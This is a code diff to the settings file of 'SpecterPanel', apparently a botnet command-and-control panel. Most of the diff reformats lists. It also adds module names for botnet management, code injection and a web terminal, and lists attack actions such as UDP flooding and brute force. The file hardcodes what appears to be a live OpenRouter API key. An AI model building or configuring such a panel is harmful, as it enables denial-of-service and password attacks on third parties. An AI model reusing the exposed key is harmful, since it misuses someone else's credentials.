@@ -96,6 +96,19 @@ class Setting:
         self.LOG_FILE_NAME = "log.txt"
         self.LOG_FILE_PATH = os.path.join(self.LOG_DIR, self.LOG_FILE_NAME)
 
+
+        # Web application paths and blueprint names
+        self.TEMPLATE_URL_PATH = "/templates"
+        self.STATIC_URL_PATH = "/static"
+        self.BLUEPRINT_NAME = [
+            "botNet_manager",
+            "code_injection_panel",
+            "public",
+            "view",
+            "user_setting",
+            "web_terminal",
+        ]
+
         # Database configuration
         self.DB_NAME = "SpecterPanel.db"
         self.DB_URI = f"sqlite:///{os.path.join(self.DB_DIR, self.DB_NAME)}"
@@ -120,17 +133,47 @@ class Setting:
 
         # Application behavior settings
         self.DELAY = 15  # Delay in seconds for instructions
-        self.CHECK_UPDATE = ['checked', 'unchecked']
-        self.CMD_CONDION = {True: "1", False: "0"}
+        self.CHECK_UPDATE = [
+            'checked', 'unchecked'
+        ]
+        self.CMD_CONDION = {
+            True: "1",
+            False: "0"
+        }
         self.OPENROUTER_API_URL_MODELS_LIST = "https://openrouter.ai/api/v1/models"
         self.API_KEY_AI = "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"
-        self.INSTRACTION = ['connectToWeb', 'connectBySocket', 'BotNet','codeInjection']
-        self.INSTRACTION_TYPE = ['CMD','BotNet','CodeInjection','Web','Socket']
-        self.INSTRACTION_BOTNET_CATEGORY = ['udp-flood','bruteForce']
-        self.STUTAS = ['Active', 'Inactive']
-        self.BOTNET_STATUS = ['pending','inprogrec','complit']
-        self.ACTION_TYPE = ['udp-flood','socket','bruteForce']
-        self.CONDEITION = ['pending','inprogrec','complit']
+        self.INSTRACTION = [
+            'connectToWeb', 
+            'connectBySocket',
+            'BotNet',
+            'codeInjection'
+        ]
+        self.INSTRACTION_TYPE = [
+            'CMD','BotNet',
+            'CodeInjection',
+            'Web','Socket'
+        ]
+        self.INSTRACTION_BOTNET_CATEGORY = [
+            'udp-flood','bruteForce'
+        ]
+        self.STUTAS = [
+            'Active', 'Inactive'
+        ]
+        self.BOTNET_STATUS = [
+            'pending',
+            'inprogrec',
+            'complit'
+        ]
+        self.ACTION_TYPE = [
+            'udp-flood',
+            'socket',
+            'bruteForce'
+        ]
+        self.CONDEITION = [
+            'pending',
+            'inprogrec',
+            'complit'
+        ]
 
     def ID(self, n=5):
         """
